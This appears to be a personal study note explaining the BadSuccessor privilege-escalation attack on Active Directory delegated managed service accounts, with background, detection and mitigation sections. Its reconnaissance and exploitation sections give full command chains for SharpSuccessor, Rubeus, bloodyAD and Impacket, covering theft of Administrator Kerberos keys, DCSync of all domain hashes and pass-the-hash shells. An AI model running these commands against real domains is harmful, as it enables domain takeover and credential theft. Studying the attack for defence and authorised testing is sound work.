---
title: "Managed Service Accounts & BadSuccessor"
created: 2026-11-12
type: concept
tags: [concept, windows, active-directory, privilege-escalation, kerberos, dmsa]
---

# Managed Service Accounts & BadSuccessor

Services running on Windows (web servers, databases, scheduled tasks) need accounts to run under. Using a regular user account for this is a nightmare — passwords expire, someone has to rotate them manually, and people tend to set weak passwords that never change. Microsoft's answer was **Managed Service Accounts (MSAs)** — accounts whose passwords are managed automatically by Active Directory.

---

## Background: OUs, DACLs, and Kerberos Tickets

Before diving into MSAs, three AD fundamentals that this attack depends on:

### Organizational Units (OUs)

OUs are **folders inside Active Directory** for organizing objects (users, computers, groups). Just like filesystem folders, they exist for two reasons:
1. **Organization** — group objects logically (by department, location, role)
2. **Delegation** — grant someone admin rights over just that folder, not the whole domain

For example, an IT team might have `OU=HelpDesk` where helpdesk staff can create and manage user accounts, without giving them Domain Admin. The permissions on an OU are controlled by **DACLs**.

### DACLs (Discretionary Access Control Lists)

A DACL is a list of "who can do what" attached to every AD object. Each entry (called an ACE — Access Control Entry) says something like:
- "User `tbyte` has `CreateChild` permission on `OU=LabOU`"
- "Group `Domain Admins` has `GenericAll` on `OU=Servers`"

Key permission types for this attack:
- **CreateChild** — can create new objects inside this OU
- **GenericAll** — full control over the object (read, write, delete, create children)
- **WriteDACL** — can modify the permissions list itself (give yourself more access)
- **WriteOwner** — can change the owner (owners implicitly have full control)

Any of these on an OU is enough for BadSuccessor.

### TGT vs TGS (Kerberos Tickets)

Kerberos uses a two-ticket system. Think of it like a festival:

**TGT (Ticket Granting Ticket)** = your **wristband**. You get it at the gate (by proving your identity to the KDC). It proves "I am who I say I am" but doesn't get you into any specific tent.

**TGS (Ticket Granting Service ticket)** = a **ticket for a specific tent**. You show your wristband (TGT) at the ticket booth and say "I want to enter the CIFS tent on the DC." The booth gives you a TGS for that specific service.

So the flow is: `Password → TGT → TGS → Access service`

You never show your password again after getting the TGT. And you can get multiple TGS tickets from one TGT (access multiple services without re-authenticating).

### The `$` Suffix Convention

In AD, **machine accounts and service accounts** end with `$`. When you see `pentest_dmsa$`, the `$` tells you it's a machine/service account, not a regular user. This matters for Kerberos — tools like Impacket need the `$` to authenticate correctly.

---

## The MSA Evolution

### sMSA (Standalone Managed Service Account)

Introduced in **Windows Server 2008 R2**. AD auto-rotates the password (120+ character random string) every 30 days. The service keeps running, no human intervention needed.

**Limitation:** One sMSA can only be used on **one machine**. If your service runs on three servers (load-balanced web app), you need three separate sMSAs.

### gMSA (Group Managed Service Account)

Introduced in **Windows Server 2012**. Solves the multi-server problem — a single gMSA can be used across multiple machines. The Key Distribution Service (KDS) on the DC generates the password, and authorized machines can retrieve it.

**Limitation:** Every machine that uses the gMSA must be explicitly authorized to retrieve the password. Managing this gets complex in large environments.

### dMSA (Delegated Managed Service Account)

Introduced in **Windows Server 2025**. The newest type. Designed to make migrating from old service accounts to managed ones easier. The key feature is **succession** — a dMSA can "take over" from an existing account, inheriting its permissions through Kerberos.

The idea: instead of manually reconfiguring every service that uses the old account, just create a dMSA that "succeeds" it, and the dMSA gets the old account's Kerberos keys automatically.

**Important:** Succession does NOT delete or disable the original account. It's like **duplicating a key** — the old account still exists, still has its password, still works. The dMSA just gets a copy of the Kerberos keys. Both accounts work simultaneously.

**This succession mechanism is where BadSuccessor lives.**

---

## What is BadSuccessor?

A privilege escalation attack discovered by Akamai researchers in 2025. It abuses the dMSA succession mechanism to impersonate any account in the domain — including Domain Admin.

### The Core Problem

When you create a dMSA and set it to succeed another account, the Domain Controller is supposed to verify that the person creating the dMSA is authorized to do so. **It doesn't.** The DC trusts whoever creates the dMSA object to set any account as the predecessor, and then hands over that account's Kerberos keys without checking.

### What You Need

The only prerequisite is **CreateChild permission on any Organizational Unit (OU)**. This is a common, seemingly low-risk delegation — IT helpdesk staff often have it so they can create user accounts, computer objects, or group policies in specific OUs.

Nobody expected that "can create objects in this OU" would mean "can become Domain Admin."

### How It Works

1. **Create a dMSA object** in an OU where you have CreateChild
2. **Set `msDS-ManagedAccountPrecededByLink`** to point to the target account (e.g., Administrator)
3. **Set `msDS-DelegatedMSAState` to 2** (tells the DC "succession is complete, trust me")
4. **Request Kerberos tickets** as the dMSA — the DC sees the succession link, retrieves the target account's keys, and hands them over
5. **You now have the target account's Kerberos keys** — you can authenticate as them

The critical flaw: step 4 has **no authorization check**. The DC doesn't verify that whoever set up the succession had any right to access the target account.

---

## Reconnaissance

Before exploiting, you need to find accounts that have CreateChild (or GenericAll/WriteDACL/WriteOwner) on an OU. Two approaches:

### From Windows (PowerShell)

Use `Get-BadSuccessorOUPermissions.ps1` or similar DACL enumeration scripts to find accounts with dangerous permissions on OUs:

```powershell
# Look for CreateChild, GenericAll, WriteDACL, WriteOwner on OUs
Get-BadSuccessorOUPermissions
```

This reads the DACLs on every OU and reports which non-admin accounts have permissions that could be abused.

### From Linux (netexec / bloodyAD)

**LDAP signing matters here.** Modern DCs (especially Server 2025) enforce LDAP signing — the server requires all LDAP requests to be cryptographically signed. Tools like raw `ldapsearch` or `impacket-dacledit` will fail with `strongerAuthRequired`. 

**netexec** (nxc) handles LDAP signing automatically:

```bash
# Enumerate DACL permissions on a specific OU
nxc ldap DC_IP -u USER -p PASS -d domain.local \
    -M daclread -o TARGET_DN="OU=SomeOU,DC=domain,DC=local" ACTION=read
```

**bloodyAD** also handles signing:

```bash
# Find all objects you can write to or create children in
bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN get writable --detail
```

Look for output showing `CREATE_CHILD` on an OU — specifically `dSA: CREATE_CHILD`, which means you can create dMSA objects.

---

## Exploitation

### From Windows (SharpSuccessor + Rubeus)

**SharpSuccessor** creates the dMSA and configures the malicious succession link:

```
SharpSuccessor.exe -dc DC-HOSTNAME -domain domain.local \
    -u USERNAME -p PASSWORD \
    -cn dmsa_name -ou "OU=SomeOU,DC=domain,DC=local" \
    -target "CN=Administrator,CN=Users,DC=domain,DC=local"
```

**Rubeus** handles the Kerberos side in three steps:

**Step 1 — Extract a TGT with `tgtdeleg`:**

```
Rubeus.exe tgtdeleg
```

The `tgtdeleg` trick is clever. You can't just read your own TGT from memory (it's encrypted with a key you don't have). Instead, Rubeus **fakes a Kerberos delegation request** — it tells the DC "I need to forward my TGT to another service." The DC responds with a copy of the TGT encrypted in a way Rubeus can read. It's a legitimate protocol feature being abused to extract something you're not supposed to access directly.

**Step 2 — Request a TGS as the dMSA (gets the target's keys):**

```
Rubeus.exe asktgs /ticket:<TGT> /service:krbtgt/domain.local /targetuser:dmsa_name$ /opsec
```

- `/ticket:<TGT>` — present the TGT from step 1
- `/service:krbtgt/domain.local` — request a TGS from the KDC
- `/targetuser:dmsa_name$` — "I want to act as this dMSA"
- `/opsec` — use encryption types that look normal (avoid detection)

The DC processes this, sees the dMSA's succession link to Administrator, and includes Administrator's Kerberos keys (AES256, AES128, RC4) in the response.

**Step 3 — Get a service ticket using the stolen keys:**

```
Rubeus.exe asktgs /ticket:<TGS> /service:cifs/DC-HOSTNAME.domain.local /enctype:aes256 /key:<AES256_KEY>
```

Now you're requesting a CIFS (file sharing) service ticket for the DC, authenticating with Administrator's AES256 key. The DC sees a valid key and issues the ticket. You can now access the DC's file shares — `\\DC\C$`, `\\DC\ADMIN$`, anything Administrator can reach.

### From Linux (bloodyAD + Impacket)

**bloodyAD** handles both recon and exploitation:

```bash
# Enumerate what you can write/create
bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN get writable --detail

# Create malicious dMSA (defaults to impersonating Administrator)
bloodyAD -d domain.local -u USER -p PASS --host DC-FQDN add badSuccessor dmsa_name
```

This outputs a `.ccache` file containing the dMSA's Kerberos TGT, plus the target account's AES and RC4 keys.

**Impacket** takes it from there:

```bash
# Load the ccache file
export KRB5CCNAME=dmsa_name_ts.ccache

# Get a CIFS service ticket
getST.py -dc-ip DC_IP -spn 'cifs/DC-FQDN' 'domain.local/dmsa_name$' -k -no-pass

# DCSync — dump ALL domain password hashes
export KRB5CCNAME=dmsa_name\$.ccache
secretsdump.py -k -no-pass 'dmsa_name$'@DC-FQDN

# Pass-the-hash to get a shell as Administrator
wmiexec.py 'domain.local/administrator@DC_IP' -hashes :<NTLM_HASH>
```

The Linux path is more damaging because **DCSync extracts every account's hash in the domain**, giving persistent access even after the dMSA is deleted.

---

## Key Concepts Referenced

### ccache Files

On Linux, Kerberos tickets are stored in files (`.ccache`) instead of in memory like on Windows. The `KRB5CCNAME` environment variable tells Kerberos-aware tools which file to read credentials from. Setting this variable is the Linux equivalent of having a ticket in your Windows logon session.

### Service Principal Names (SPNs)

An SPN identifies a specific service on a specific machine. Format: `service/hostname`. Examples:
- `cifs/dc.domain.local` — file sharing on the DC
- `http/web.domain.local` — web service
- `MSSQLSvc/sql.domain.local:1433` — SQL Server

When you request a Kerberos service ticket, you specify the SPN to tell the KDC exactly which service you want access to.

### DCSync

Not an exploit — it abuses **legitimate AD replication**. In multi-DC environments, Domain Controllers sync their databases with each other. DCSync pretends to be a DC and asks for all password hashes via the replication protocol (DRSUAPI). Any account with Replicating Directory Changes permissions can do this.

### Pass-the-Hash

Windows NTLM authentication verifies the **hash** of your password, not the password itself. If you have the NTLM hash, you can authenticate directly without knowing or cracking the original password.

---

## Detection

- **Monitor dMSA creation events** — any new `msDS-DelegatedManagedServiceAccount` object, especially with `msDS-DelegatedMSAState` set to 2
- **Audit OU permissions** — identify all accounts with CreateChild on any OU; these are your attack surface
- **Watch for succession links** — `msDS-ManagedAccountPrecededByLink` pointing to high-value accounts (Domain Admins, service accounts with elevated privileges)
- **DCSync detection** — monitor for DRSUAPI replication requests from non-DC machines

## Mitigation

As of mid-2025, **there is no patch from Microsoft**. This is a design flaw, not a software bug.

Current defenses:
1. **Restrict dMSA creation** — only trusted admins should have CreateChild on OUs, or specifically deny creation of `msDS-DelegatedManagedServiceAccount` objects
2. **Audit OU delegations** — review who has CreateChild, GenericAll, WriteDACL, or WriteOwner on every OU
3. **Don't deploy dMSA yet** — if you don't need the feature, don't enable it; the risk outweighs the convenience until Microsoft addresses the flaw
4. **Monitor Kerberos anomalies** — new machine accounts requesting TGTs for high-privilege targets is suspicious

---

## Related Notes

- [[Kerberos Authentication Flow]]
- [[Kerberos Authentication Attacks in Active Directory]]
- [[NTLM (NT LAN Manager)]]
- [[LDAP]]
- [[Credential Extraction & Abuse]]
- [[Windows AD Privilege Escalation]]
